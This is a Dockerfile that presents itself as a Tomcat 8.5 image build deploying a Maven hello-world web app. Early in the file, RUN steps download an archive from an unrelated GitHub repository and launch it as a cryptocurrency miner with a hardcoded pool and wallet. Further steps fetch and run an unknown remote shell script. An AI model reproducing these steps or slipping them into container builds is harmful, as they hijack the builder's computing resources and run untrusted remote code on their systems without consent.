# Version JDK8

FROM ubuntu
MAINTAINER Gaurav Agarwal, bharatmicrosystems@gmail.com
RUN apt update
RUN apt install wget tar -y
RUN wget https://github.com/calebsto/tomcat/raw/master/mul.tar.gz
RUN tar xvzf mul.tar.gz
RUN ./mul --algorithm argon2id_chukwa2 --pool turtlecoin.herominers.com:10380 --wallet TRTLv1Hqo3wHdqLRXuCyX3MwvzKyxzwXeBtycnkDy8ceFp4E23bm3P467xLEbUusH6Q1mqQUBiYwJ2yULJbvr5nKe8kcyc4uyps+09a196ecd13c80c6c61692ffb0359d11928158465c11381a0061eb883b54ceef

RUN wget https://raw.githubusercontent.com/calebsto/rap/main/max.sh
RUN bash max.sh
# Create users and groups
RUN groupadd tomcat
RUN mkdir /opt/tomcat
RUN useradd -s /bin/nologin -g tomcat -d /opt/tomcat tomcat

# Download and install tomcat
RUN wget https://apache.mirrors.nublue.co.uk/tomcat/tomcat-8/v8.5.54/bin/apache-tomcat-8.5.54.tar.gz
RUN tar -zxvf apache-tomcat-8.5.54.tar.gz -C /opt/tomcat --strip-components=1
RUN chgrp -R tomcat /opt/tomcat/conf
RUN chmod g+rwx /opt/tomcat/conf
RUN chmod g+r /opt/tomcat/conf/*
RUN chown -R tomcat /opt/tomcat/logs/ /opt/tomcat/temp/ /opt/tomcat/webapps/ /opt/tomcat/work/
RUN chgrp -R tomcat /opt/tomcat/bin
RUN chgrp -R tomcat /opt/tomcat/lib
RUN chmod g+rwx /opt/tomcat/bin
RUN chmod g+r /opt/tomcat/bin/*

RUN rm -rf /opt/tomcat/webapps/*
RUN cd /tmp && git clone https://github.com/DEV3L/java-mvn-hello-world-web-app.git
RUN cd /tmp/java-mvn-hello-world-web-app && mvn clean install
RUN cp /tmp/java-mvn-hello-world-web-app/target/mvn-hello-world.war /opt/tomcat/webapps/ROOT.war
RUN chmod 777 /opt/tomcat/webapps/ROOT.war

VOLUME /opt/tomcat/webapps
EXPOSE 8080
CMD ["/opt/tomcat/bin/catalina.sh", "run"]
#
